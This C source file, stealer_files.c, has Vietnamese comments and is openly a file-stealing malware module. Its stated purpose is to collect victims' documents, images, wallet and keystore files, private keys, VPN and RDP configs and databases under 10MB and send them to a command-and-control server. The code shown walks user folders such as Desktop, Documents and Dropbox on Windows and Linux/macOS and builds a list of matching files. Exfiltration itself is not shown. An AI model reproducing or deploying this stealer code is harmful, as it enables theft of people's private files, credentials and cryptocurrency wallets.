/**
 * stealer_files.c
 * Quet o dia tim file theo pattern (.doc, .pdf, .txt, .jpg, v.v.)
 * Gioi han kich thuoc file < 10MB, nen zip va gui ve C2
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>

#ifdef _WIN32
    #include <windows.h>
    #include <shlobj.h>
#else
    #include <unistd.h>
    #include <sys/stat.h>
    #include <dirent.h>
    #include <pwd.h>
#endif

#include "stealer_files.h"

/* Danh sach pattern file can tim */
static const char* PATTERN_FILE[] = {
    "*.doc", "*.docx", "*.xls", "*.xlsx", "*.pdf",
    "*.txt", "*.csv", "*.json", "*.xml",
    "*.jpg", "*.jpeg", "*.png", "*.bmp",
    "*.wallet", "*.keystore", "*.dat", "*.key",
    "*.ovpn", "*.rdp", "*.sql", "*.db",
    NULL
};

/* Thu muc can quet */
static const char* THU_MUC_QUET[] = {
    "Desktop",
    "Documents",
    "Downloads",
    "Pictures",
    "OneDrive",
    "Dropbox",
    NULL
};

#ifdef _WIN32
/* ==================== WINDOWS FILE STEALER ==================== */

/**
 * Quet file trong thu muc
 * Dau vao: thu_muc - duong dan thu muc
 *          pattern - pattern file
 *          danh_sach - buffer de chua ket qua
 *          kich_thuoc - kich thuoc buffer
 *          so_file_hien_tai - con tro dem so file
 *          gioi_han - gioi han so file
 */
static void quet_file(const char* thu_muc, const char* pattern,
                      char* danh_sach, size_t kich_thuoc,
                      int* so_file_hien_tai, int gioi_han) {
    if (*so_file_hien_tai >= gioi_han) return;
    
    char search_path[512];
    snprintf(search_path, sizeof(search_path), "%s\\%s", thu_muc, pattern);
    
    WIN32_FIND_DATAA find_data;
    HANDLE find_handle = FindFirstFileA(search_path, &find_data);
    
    if (find_handle == INVALID_HANDLE_VALUE) return;
    
    int offset = strlen(danh_sach);
    
    do {
        if (*so_file_hien_tai >= gioi_han) break;
        if (strcmp(find_data.cFileName, ".") == 0 || 
            strcmp(find_data.cFileName, "..") == 0) continue;
        
        /* Bo qua file qua lon (> 10MB) */
        if (find_data.nFileSizeLow > 10485760) continue;
        
        /* Bo qua thu muc */
        if (find_data.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) continue;
        
        char full_path[512];
        snprintf(full_path, sizeof(full_path), "%s\\%s", thu_muc, find_data.cFileName);
        
        if (*so_file_hien_tai > 0) {
            offset += snprintf(danh_sach + offset, kich_thuoc - offset, ",");
        }
        
        /* Escape path */
        offset += snprintf(danh_sach + offset, kich_thuoc - offset, "{\"path\":\"");
        for (int j = 0; full_path[j] != '\0'; j++) {
            if (full_path[j] == '\\') {
                offset += snprintf(danh_sach + offset, kich_thuoc - offset, "\\\\");
            } else if (full_path[j] == '"') {
                offset += snprintf(danh_sach + offset, kich_thuoc - offset, "\\\"");
            } else {
                offset += snprintf(danh_sach + offset, kich_thuoc - offset, "%c", full_path[j]);
            }
        }
        
        offset += snprintf(danh_sach + offset, kich_thuoc - offset,
            "\",\"size\":%lu,\"modified\":%lu}",
            find_data.nFileSizeLow, 
            (unsigned long)find_data.ftLastWriteTime.dwLowDateTime);
        
        (*so_file_hien_tai)++;
        
    } while (FindNextFileA(find_handle, &find_data));
    
    FindClose(find_handle);
}

/**
 * Steal files tu cac thu muc quan trong
 */
int steal_files(char* ket_qua, size_t ket_qua_size) {
    char user_profile[512];
    if (SHGetFolderPathA(NULL, CSIDL_PROFILE, NULL, 0, user_profile) != S_OK) {
        snprintf(ket_qua, ket_qua_size, "{\"files\":[]}");
        return -1;
    }
    
    int offset = 0;
    offset += snprintf(ket_qua + offset, ket_qua_size - offset, "{\"files\":[");
    
    int so_file = 0;
    int gioi_han = 200; /* Gioi han so file */
    int da_co_file = 0;
    
    /* Quet tung thu muc */
    for (int i = 0; THU_MUC_QUET[i] != NULL; i++) {
        char thu_muc[512];
        snprintf(thu_muc, sizeof(thu_muc), "%s\\%s", user_profile, THU_MUC_QUET[i]);
        
        /* Kiem tra thu muc ton tai */
        DWORD attr = GetFileAttributesA(thu_muc);
        if (attr == INVALID_FILE_ATTRIBUTES || !(attr & FILE_ATTRIBUTE_DIRECTORY)) {
            continue;
        }
        
        /* Quet tung pattern */
        for (int j = 0; PATTERN_FILE[j] != NULL; j++) {
            char danh_sach_tam[65536] = {0};
            int so_file_truoc = so_file;
            
            /* Khoi tao JSON array neu can */
            if (da_co_file == 0 && so_file == 0) {
                strcpy(danh_sach_tam, "");
            }
            
            quet_file(thu_muc, PATTERN_FILE[j], danh_sach_tam, sizeof(danh_sach_tam),
                      &so_file, gioi_han);
            
            if (so_file > so_file_truoc) {
                if (da_co_file > 0) {
                    offset += snprintf(ket_qua + offset, ket_qua_size - offset, ",");
                }
                offset += snprintf(ket_qua + offset, ket_qua_size - offset, "%s", danh_sach_tam);
                da_co_file++;
            }
            
            if (so_file >= gioi_han) break;
        }
        
        if (so_file >= gioi_han) break;
    }
    
    offset += snprintf(ket_qua + offset, ket_qua_size - offset, "]}");
    return so_file;
}

#else
/* ==================== LINUX/MACOS FILE STEALER ==================== */

static void quet_file_linux(const char* thu_muc, const char* pattern,
                            char* danh_sach, size_t kich_thuoc,
                            int* so_file_hien_tai, int gioi_han) {
    if (*so_file_hien_tai >= gioi_han) return;
    
    /* Dung find command de tim file */
    char cmd[1024];
    char duoi[32];
    
    /* Trich xuat duoi file tu pattern */
    strncpy(duoi, pattern + 1, sizeof(duoi) - 1); /* Bo qua dau * */
    
    char output_file[256];
    snprintf(output_file, sizeof(output_file), "/tmp/steal_find_%d.txt", (int)time(NULL));
    
    snprintf(cmd, sizeof(cmd), 
             "find \"%s\" -type f -name \"%s\" -size -10M 2>/dev/null | head -%d > \"%s\"",
             thu_muc, pattern, gioi_han - *so_file_hien_tai, output_file);
    system(cmd);
    
    FILE* f = fopen(output_file, "r");
    if (f == NULL) return;
    
    char line[512];
    int offset = strlen(danh_sach);
    
    while (fgets(line, sizeof(line), f) && *so_file_hien_tai < gioi_han) {
        /* Xoa newline */
        size_t len = strlen(line);
        if (len > 0 && line[len - 1] == '\n') line[len - 1] = '\0';
        
        if (strlen(line) == 0) continue;
        
        /* Lay kich thuoc file */
        struct stat st;
        if (stat(line, &st) != 0) continue;
        
        if (*so_file_hien_tai > 0) {
            offset += snprintf(danh_sach + offset, kich_thuoc - offset, ",");
        }
        
        offset += snprintf(danh_sach + offset, kich_thuoc - offset,
            "{\"path\":\"%s\",\"size\":%ld}", line, (long)st.st_size);
        
        (*so_file_hien_tai)++;
    }
    
    fclose(f);
    unlink(output_file);
}

int steal_files(char* ket_qua, size_t ket_qua_size) {
    const char* home = getenv("HOME");
    if (home == NULL) home = "/root";
    
    int offset = 0;
    offset += snprintf(ket_qua + offset, ket_qua_size - offset, "{\"files\":[");
    
    int so_file = 0;
    int gioi_han = 200;
    int da_co_file = 0;
    
    for (int i = 0; THU_MUC_QUET[i] != NULL; i++) {
        char thu_muc[512];
        snprintf(thu_muc, sizeof(thu_muc), "%s/%s", home, THU_MUC_QUET[i]);
        
        if (access(thu_muc, F_OK) != 0) continue;
        
        for (int j = 0; PATTERN_FILE[j] != NULL; j++) {
            char danh_sach_tam[65536] = {0};
            int so_file_truoc = so_file;
            
            quet_file_linux(thu_muc, PATTERN_FILE[j], danh_sach_tam, 
                           sizeof(danh_sach_tam), &so_file, gioi_han);
            
            if (so_file > so_file_truoc) {
                if (da_co_file > 0) {
                    offset += snprintf(ket_qua + offset, ket_qua_size - offset, ",");
                }
                offset += snprintf(ket_qua + offset, ket_qua_size - offset, "%s", danh_sach_tam);
                da_co_file++;
            }
            
            if (so_file >= gioi_han) break;
        }
        if (so_file >= gioi_han) break;
    }
    
    offset += snprintf(ket_qua + offset, ket_qua_size - offset, "]}");
    return so_file;
}

#endif